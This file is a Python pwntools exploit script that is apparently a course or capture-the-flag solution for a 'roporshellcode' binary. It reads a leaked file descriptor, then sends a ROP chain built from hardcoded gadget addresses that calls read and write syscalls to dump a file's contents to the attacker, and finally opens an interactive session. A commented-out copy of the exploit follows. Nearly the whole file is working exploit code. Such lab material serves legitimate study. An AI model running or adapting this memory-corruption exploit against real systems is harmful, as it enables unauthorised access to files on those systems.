#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 7003

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

# ropper -f roporshellcode --search rax / eax / 

def exploit():
    # get fd
    P.recvuntil(b'fd: ')
    fd = int(P.recvline()[:-1], 16)

    # construct a payload
    payload = b'AAAAAAAA'

    # # rop chain to read 256 bytes - read(3 {fd}, buffer, bytes_to_read) # #

    chain = b''
    chain += p64(0x004011bf)                # xor rdx, rdx
    chain += p64(0x004011d4)                # mov rax, rdx; mov rdi, rdx (rax needs to be 0)
    chain += p64(0x004011db) * fd           # inc rdi
    # rsi already has buffer loaded, we could set rsi to rsp but we are executing gadgets
    chain += p64(0x004011cf) * 256          # add rdx, 1
    chain += p64(0x004011c3)                # syscall

    # # now, let's write from buffer to stdout - write(stdout {1}, buffer, bytes_read) # #

    chain += p64(0x004011bf)                # xor rdx, rdx
    chain += p64(0x004011cf) * 1            # add rdx, 1
    chain += p64(0x004011d4)                # mov rax, rdx; mov rdi, rdx (rax needs to 1)
    chain += p64(0x004011cf) * 255          # add rdx, 1
    chain += p64(0x004011c3)                # syscall

    payload = b'A' * 8 + b'B' * 8 + chain
    P.sendlineafter(b'Gimme data: \n', payload)
    P.interactive()
    

# def exploit():
#     P.recvuntil(b'fd: ')
#     fd = int(P.recvline(keepends=False))

#     chain = b''
#     chain += p64(0x004011bf)                # xor rdx, rdx
#     chain += p64(0x004011d4)                # mov rax, rdx; mov rdi, rdx
#     chain += p64(0x004011db) * fd           # inc rdi
#     chain += p64(0x004011cf) * 256          # add rdx, 1
#     chain += p64(0x004011c3)                # syscall
#     chain += p64(0x004011bf)                # xor rdx, rdx
#     chain += p64(0x004011cf)                # add rdx, 1
#     chain += p64(0x004011d4)                # mov rax, rdx; mov rdi, rdx
#     chain += p64(0x004011cf) * 255          # add rdx, 1
#     chain += p64(0x004011c3)                # syscall

#     payload = b'q' * 8 + b'q' * 8 + chain

#     P.sendlineafter(b'Gimme data: \n', payload)

#     P.interactive()
#     P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
